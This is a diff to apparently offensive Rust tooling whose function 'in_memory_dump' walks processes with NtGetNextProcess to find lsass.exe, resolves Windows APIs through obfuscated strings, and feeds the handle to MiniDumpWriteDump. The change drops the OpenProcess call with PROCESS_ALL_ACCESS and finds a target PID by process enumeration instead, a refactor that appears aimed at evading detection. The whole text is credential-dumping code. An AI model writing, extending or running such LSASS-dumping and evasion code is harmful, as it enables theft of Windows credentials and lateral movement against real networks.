@@ -26,7 +26,6 @@ use winapi::{
             LUID_AND_ATTRIBUTES, 
             MAXIMUM_ALLOWED,
             PTOKEN_PRIVILEGES,
-            PROCESS_ALL_ACCESS,
             RtlCopyMemory, 
             SE_DEBUG_NAME,
             SE_PRIVILEGE_ENABLED,
@@ -354,7 +353,6 @@ pub fn in_memory_dump(args: Vec<&str>) -> String {
     let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
     let ntdll_handle = get_dll(obfstr::obfstr!("ntdll.dll"));
     let psapi_handle = get_dll(obfstr::obfstr!("psapi.dll"));
-    let op_func = get_fn(k32_handle, obfstr::obfstr!("OpenProcess\0"));
     let getnext_func = get_fn(ntdll_handle, obfstr::obfstr!("NtGetNextProcess\0"));
     let mdwd_func = get_fn(dbghelp_handle, obfstr::obfstr!("MiniDumpWriteDump\0"));
     let getfilename_func = get_fn(psapi_handle, obfstr::obfstr!("GetModuleFileNameExW\0"));
@@ -376,12 +374,6 @@ pub fn in_memory_dump(args: Vec<&str>) -> String {
     let FreeLibrary: unsafe fn(
         HMODULE, 
     ) -> bool = unsafe { std::mem::transmute(freelib_func as FARPROC) };
-
-    let OpenProcess: unsafe fn(
-        DWORD, 
-        i32,
-        DWORD, 
-    ) -> HANDLE = unsafe { std::mem::transmute(op_func as FARPROC) };
 
     let NtGetNextProcess: unsafe fn(
         HANDLE, 
@@ -411,34 +403,32 @@ pub fn in_memory_dump(args: Vec<&str>) -> String {
     #[allow(unused_assignments)]
     let mut handle: HANDLE = 0 as _;
     
-    if pid == 0 {
-        // get lsass.exe handle
-        while unsafe { NtGetNextProcess(
+    while unsafe { NtGetNextProcess(
+        handle,
+        MAXIMUM_ALLOWED,
+        0,
+        0,
+        &mut handle,
+    )} == 0 {
+        let mut buf = [0; MAX_PATH];
+        let _ = unsafe { GetModuleFileNameExW(
             handle,
-            MAXIMUM_ALLOWED,
-            0,
-            0,
-            &mut handle,
-        )} == 0 {
-            let mut buf = [0; MAX_PATH];
-            let _ = unsafe { GetModuleFileNameExW(
-                handle,
-                0 as _,
-                &mut buf[0],
-                MAX_PATH as _,
-            )};
-            let buf_str = String::from_utf16_lossy(&buf[..MAX_PATH]);
+            0 as _,
+            &mut buf[0],
+            MAX_PATH as _,
+        )};
+        let buf_str = String::from_utf16_lossy(&buf[..MAX_PATH]);
+        if pid == 0 {
             if buf_str.contains(obfstr::obfstr!("C:\\Windows\\System32\\lsass.exe")) {
+                // get lsass.exe handle
                 pid = unsafe { GetProcessId(handle) };
                 break;
             }
+        } else {
+            if pid == unsafe { GetProcessId(handle) } {
+                break;
+            }
         }
-    } else {
-        handle = unsafe { OpenProcess(
-            PROCESS_ALL_ACCESS,
-            0x01,
-            pid
-        )};
     }
 
     if handle.is_null() {
